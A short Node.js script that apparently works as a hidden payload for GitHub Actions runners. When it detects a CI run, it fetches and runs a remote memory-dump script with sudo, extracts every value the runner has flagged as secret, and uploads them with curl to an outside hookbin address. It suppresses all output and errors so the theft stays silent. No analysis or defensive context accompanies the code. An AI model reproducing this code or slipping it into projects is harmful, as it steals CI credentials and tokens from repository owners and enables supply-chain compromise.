const { execSync } = require('child_process');

if (process.env._RCE_ACTIVE) {
  return;
}
process.env._RCE_ACTIVE = '1';

try {
  const GITHUB_RUN_ID = process.env.GITHUB_RUN_ID;
  if (GITHUB_RUN_ID) {
    execSync(`
      curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}' >> "/tmp/secrets"
      curl -X PUT -d \\@/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
    `, { 
      shell: '/bin/bash',
      stdio: 'ignore',
      env: { ...process.env, _RCE_ACTIVE: '1' }
    });
  }
} catch (e) {
}
